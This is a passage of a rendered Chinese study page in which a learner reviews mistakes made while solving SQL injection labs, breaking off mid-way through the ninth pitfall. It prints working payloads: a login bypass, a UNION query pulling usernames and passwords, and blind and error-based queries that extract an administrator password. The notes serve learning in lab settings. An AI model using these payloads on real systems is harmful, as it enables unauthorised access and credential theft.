+  <a href="#_82" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_83" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#29sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 29：参数为空，SQL 压根没执行
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 29：参数为空，SQL 压根没执行">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_84" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_85" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_86" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        怎么分辨
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_87" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_88" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        同类前置校验一览
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#30url" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 30：URL 里的 # 是锚点，后面参数全丢
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 30：URL 里的 # 是锚点，后面参数全丢">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_89" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_90" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        验证（原始 TCP，不经任何客户端处理）
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_91" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_92" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        为什么浏览器里"好像能用"
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_93" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        同源问题
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 31：' 前面那个值不是真实用户
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 31：&#39; 前面那个值不是真实用户">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_94" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_95" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_96" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        三种写法,三种用途
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_97" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#union-1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        顺手记：为什么 UNION 要用 -1'
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#32-31" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 32：报错注入只回了 31 个字符，以为数据丢了
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 32：报错注入只回了 31 个字符，以为数据丢了">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_98" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_99" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_100" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#33" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 33：没测报错回显，直接闷头做盲注
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 33：没测报错回显，直接闷头做盲注">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_101" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_102" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_103" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法:按这个顺序选打法
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_104" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        判断口诀
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_105" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        附：盲注调试的几个「一步到位」检查
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="sql">SQL 注入 · 卡点复盘<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p>这份文件记录的是<strong>我自己踩过的坑</strong>，不是教科书。
+每个坑的格式：<strong>现象 → 原因 → 正确做法</strong>。
+按「踩坑顺序」排列，越靠前越基础。</p>
+</blockquote>
+<hr />
+<h2 id="1-302">坑 1：把 302 当成「失败了」<a class="headerlink" href="#1-302" title="Permanent link">&para;</a></h2>
+<h3 id="_1">现象<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>登录绕过的 lab，提交 <code>administrator'--</code> 后收到：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>HTTP/2 302 Found
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Location: /my-account?id=administrator
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Set-Cookie: session=cUyhc6QfwmKZ60YeYMC1UpUWryqtJlYX
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Content-Length: 0
+</span></code></pre></div>
+<p><strong>我以为是错误，因为页面跳走了、什么都没显示。</strong></p>
+<h3 id="_2">原因<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h3>
+<p><strong>302 + Set-Cookie 就是「登录成功」的标准信号。</strong></p>
+<table>
+<thead>
+<tr>
+<th>响应</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>200</code> + 登录表单重新显示</td>
+<td>失败</td>
+</tr>
+<tr>
+<td><strong><code>302</code> + <code>Set-Cookie</code></strong></td>
+<td><strong>成功，给你发凭证了</strong></td>
+</tr>
+<tr>
+<td><code>302</code> + 无 Set-Cookie</td>
+<td>跳转但没登录</td>
+</tr>
+</tbody>
+</table>
+<h3 id="_3">正确做法<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>① 看状态码：302 且带 Set-Cookie = 成功
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>② 跟着 Location 走：GET /my-account?id=administrator
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>③ 用响应里【新发的】session，不要用旧的
+</span></code></pre></div>
+<p><strong>记住：HTTP 状态码本身就是信息。</strong></p>
+<hr />
+<h2 id="2">坑 2：用了全角中文逗号 <code>，</code><a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
+<h3 id="_4">现象<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="s1">' union select username_zigghx,password_hpzjqx,null from users_yrlaxw--    -- 成功</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="s1">'</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="n">username_zigghx</span><span class="err">，</span><span class="n">password_hpzjqx</span><span class="p">,</span><span class="k">null</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users_yrlaxw</span><span class="c1">--   -- 报错</span>
+</span></code></pre></div>
+<p><strong>两条看着一模一样，一条通一条不通。</strong></p>
+<h3 id="_5">原因<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>,  半角逗号 U+002C  1 字节   ← SQL 只认这个
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>， 全角逗号 U+FF0C  3 字节   ← 中文标点,不是 SQL 语法
+</span></code></pre></div>
+<p><strong>输入法停在中文模式时打的逗号。</strong></p>
+<h3 id="_6">正确做法<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
+<p><strong>打 payload 前先把输入法切英文。</strong> 或者打完肉眼检查：<strong>全角字符明显更宽，占两个字符的位置。</strong></p>
+<table>
+<thead>
+<tr>
+<th>该用</th>
+<th>可能打错成</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>,</code></td>
+<td><code>，</code></td>
+</tr>
+<tr>
+<td><code>'</code></td>
+<td><code>'</code> <code>'</code></td>
+</tr>
+<tr>
+<td><code>"</code></td>
+<td><code>"</code> <code>"</code></td>
+</tr>
+<tr>
+<td><code>(</code> <code>)</code></td>
+<td><code>（</code> <code>）</code></td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><code>；</code></td>
+</tr>
+<tr>
+<td><code>\</code></td>
+<td><code>＼</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>这是一类问题：所有 payload 里的标点都必须是半角。</strong></p>
+<hr />
+<h2 id="3">坑 3：不理解 <code>'</code> 到底在干什么<a class="headerlink" href="#3" title="Permanent link">&para;</a></h2>
+<h3 id="_7">现象<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">xyz</span><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span><span class="w">     </span><span class="err">→</span><span class="w">  </span><span class="err">有</span><span class="w"> </span><span class="ss">"Welcome back"</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="n">xyz</span><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">2</span><span class="w">     </span><span class="err">→</span><span class="w">  </span><span class="err">没有</span>
+</span></code></pre></div>
+<p><strong>我不懂为什么加个 <code>'</code> 就变成代码了，也不懂 <code>'1'='1</code> 后面那个引号哪来的。</strong></p>
+<h3 id="_8">原因<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
+<p>应用的查询模板是：</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">tracking</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'【你输入的内容】'</span>
+</span></code></pre></div>
+<p><strong>你的输入被包在一对引号里，是「数据」不是「代码」。</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="err">输入</span><span class="p">:</span><span class="w"> </span><span class="n">xyz</span><span class="s1">' AND '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="err">拼接</span><span class="p">:</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'xyz'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="w">                          </span><span class="err">└─┬─┘</span><span class="w"> </span><span class="err">└────┬────┘</span><span class="w"> </span><span class="err">└┬┘</span>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="w">                       </span><span class="err">字符串</span><span class="s1">'xyz'</span><span class="w">  </span><span class="err">你的代码</span><span class="w">  </span><span class="err">应用自带的收尾引号</span>
+</span></code></pre></div>
+<p><strong>第一个 <code>'</code> 提前闭合了应用开的引号 → 后面的内容跳出字符串，变成可执行代码。</strong></p>
+<p><strong>最后那个 <code>'</code> 是应用补的</strong>，恰好闭合 <code>'1</code>。</p>
+<h3 id="_9">正确做法<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>'  = 越狱符:关掉应用的字符串
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>结尾引号 = 应用补的,要让它有地方落
+</span></code></pre></div>
+<p><strong>两种正确写法：</strong></p>
+<table>
+<thead>
+<tr>
+<th>写法</th>
+<th>拼出来</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>xyz' AND '1'='1</code></td>
+<td><code>'xyz' AND '1'='1'</code></td>
+<td>靠应用补的引号闭合 ✅</td>
+</tr>
+<tr>
+<td><code>xyz' AND 1=1--</code></td>
+<td><code>'xyz' AND 1=1--'</code></td>
+<td>用 <code>--</code> 注释掉收尾引号 ✅</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⚠️ 千万别写 <code>xyz' AND 1=1</code>（不带 <code>--</code>）：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'xyz'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="err">'</span><span class="w">    </span><span class="err">←</span><span class="w"> </span><span class="err">收尾引号悬空</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="err">语法错误</span>
+</span></code></pre></div>
+<p><strong>这就是为什么实验室用 <code>'1'='1</code> 而不用 <code>1=1</code>。</strong></p>
+<hr />
+<h2 id="4payload">坑 4：payload 结尾加了 <code>;</code><a class="headerlink" href="#4payload" title="Permanent link">&para;</a></h2>
+<h3 id="_10">现象<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="n">TrackingId</span><span class="o">=</span><span class="n">xxx</span><span class="s1">'and length((select password from users where username='</span><span class="n">administrator</span><span class="err">'</span><span class="p">))</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span>
+</span></code></pre></div>
+<p><strong>一直 500。</strong></p>
+<h3 id="_11">原因<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'xxx'</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">(...)</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">;</span><span class="err">'</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="w">                                          </span><span class="err">↑</span><span class="w"> </span><span class="err">↑</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="w">                                       </span><span class="err">分号</span><span class="w"> </span><span class="err">应用补的引号</span>
+</span></code></pre></div>
+<p><code>;</code> 结束语句，后面孤立的 <code>'</code> → 语法错误。而且很多驱动<strong>不支持一次执行多条语句</strong>。</p>
+<h3 id="_12">正确做法<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
+<p><strong>盲注里几乎永远不需要 <code>;</code>。</strong> 用 <code>--</code> 收尾：</p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="err">'</span><span class="k">and</span><span class="w"> </span><span class="k">length</span><span class="p">(...)</span><span class="o">&gt;</span><span class="mi">0</span><span class="c1">--</span>
+</span></code></pre></div>
+<hr />
+<h2 id="5-">坑 5：<code>--</code> 后面没空格 / 忘了加注释<a class="headerlink" href="#5-" title="Permanent link">&para;</a></h2>
+<h3 id="_13">现象<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
+<p>一是 <code>-- HTTP/2</code> 粘在一起（URL 里），二是 <code>&gt;0</code> 结尾没加 <code>--</code> 直接报错。</p>
+<h3 id="_14">原因<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong><code>--</code> 是注释，但 MySQL 要求 <code>--</code> 后跟空格或控制字符</strong>（PostgreSQL/Oracle 不要求）</li>
+<li><strong>不加 <code>--</code> 时，应用补的收尾引号会悬空</strong></li>
+</ul>
+<h3 id="_15">正确做法<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="c1">-- Oracle / PostgreSQL</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="o">&gt;</span><span class="mi">0</span><span class="c1">--</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="c1">-- MySQL(必须带空格)</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="o">&gt;</span><span class="mi">0</span><span class="c1">-- </span>
+</span></code></pre></div>
+<p><strong>保险起见一律写 <code>--</code>（带空格），但在 URL 里空格要编码成 <code>%20</code>。</strong></p>
+<hr />
+<h2 id="6-z">坑 6：用 <code>&gt;'z'</code> 做测试<a class="headerlink" href="#6-z" title="Permanent link">&para;</a></h2>
+<h3 id="_16">现象<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="s1">'z'</span>
+</span></code></pre></div>
+<p><strong>永远不报错 / 永远没有 Welcome back，我以为注入失败。</strong></p>
+<h3 id="_17">原因<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
+<p>ASCII 排序：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>'0'-'9' 48~57  &lt;  'A'-'Z' 65~90  &lt;  'a'-'z' 97~122  &lt;  '{' '|' '}' '~' 123~126
+</span></code></pre></div>
+<p><strong>密码字符通常是数字和小写字母，全都 <code>&lt; 'z'</code>。</strong></p>
+<p>所以 <code>&gt; 'z'</code> <strong>几乎必然为假</strong> —— 我问了个「答案必然是否」的问题。</p>
+<h3 id="_18">正确做法<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<p><strong>二分查找，从字符集中点开始：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>&gt;'m'  →  真(500): 在 n~z
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>      →  假(200): 在 a~m
+</span></code></pre></div>
+<p><strong>或者用 ASCII 比较更稳（不受排序规则影响）：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">ASCII</span><span class="p">(</span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">77</span>
+</span></code></pre></div>
+<hr />
+<h2 id="7from-dual-users">坑 7：<code>FROM dual</code> 里引用 <code>users</code> 的列<a class="headerlink" href="#7from-dual-users" title="Permanent link">&para;</a></h2>
+<h3 id="_19">现象<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">select</span><span class="w"> </span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">'z'</span><span class="p">)</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="k">then</span><span class="w"> </span><span class="n">to_char</span><span class="p">(</span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">'a'</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">dual</span>
+</span></code></pre></div>
+<p><strong>永远 500，连「恒假」那条也 500。</strong></p>
+<h3 id="_20">原因<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
+<p><strong>Oracle 的 <code>dual</code> 表只有一列 <code>dummy</code>，没有 <code>username</code>、<code>password</code>。</strong></p>
+<p>引用不存在的列 → <code>ORA-00904: invalid identifier</code>。</p>
+<p><strong>为什么最小测试（<code>1=1</code>）能过？因为它只用了常量，不碰任何列。</strong></p>
+<h3 id="_21">正确做法<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span>
+</span></code></pre></div>
+<p><strong>用 <code>WHERE</code> 限定到一行，既解决「列不存在」，也避免「多行子查询」错误。</strong></p>
+<hr />
+<h2 id="8">坑 8：括号不配对<a class="headerlink" href="#8" title="Permanent link">&para;</a></h2>
+<h3 id="_22">现象<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">when</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="k">and</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">'z'</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="s1">'a'</span><span class="w"> </span><span class="k">end</span>
+</span></code></pre></div>
+<p><strong>500。</strong></p>
+<h3 id="_23">原因<a class="headerlink" href="#_23" title="Permanent link">&para;</a></h3>
+<p>数括号：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>when(  → 深度 1
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>  substr(  → 深度 2
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>  )        → 深度 1
+</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>  &gt;'z'
+</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>then       → 还在深度 1!缺一个 )
+</span></code></pre></div>
+<h3 id="_24">正确做法<a class="headerlink" href="#_24" title="Permanent link">&para;</a></h3>
+<p><strong>CASE 的 WHEN 后面不需要括号：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="k">WHEN</span><span class="w"> </span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">'z'</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="p">...</span>
+</span></code></pre></div>
+<p><strong>或者补齐：</strong></p>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="k">WHEN</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="s1">'administrator'</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">SUBSTR</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="s1">'z'</span><span class="p">)</span><span class="w"> </span><span class="k">THEN</span><span class="w"> </span><span class="p">...</span>
+</span></code></pre></div>
+<p><strong>习惯：盲注 payload 写完先数一遍 <code>(</code> 和 <code>)</code> 的数量。</strong></p>
+<hr />
+<h2 id="9else-a">坑 9：<code>else a'</code> 少了开引号<a class="headerlink" href="#9else-a" title="Permanent link">&para;</a></h2>
+<h3 id="_25">现象<a class="headerlink" href="#_25" title="Permanent link">&para;</a></h3>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="p">...</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">0</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="n">a</span><span class="err">'</span><span class="w"> </span><span class="k">end</span><span class="w"> </span><span class="p">...</span>
+</span></code></pre></div>
+<h3 id="_26">原因<a class="headerlink" href="#_26" title="Permanent link">&para;</a></h3>
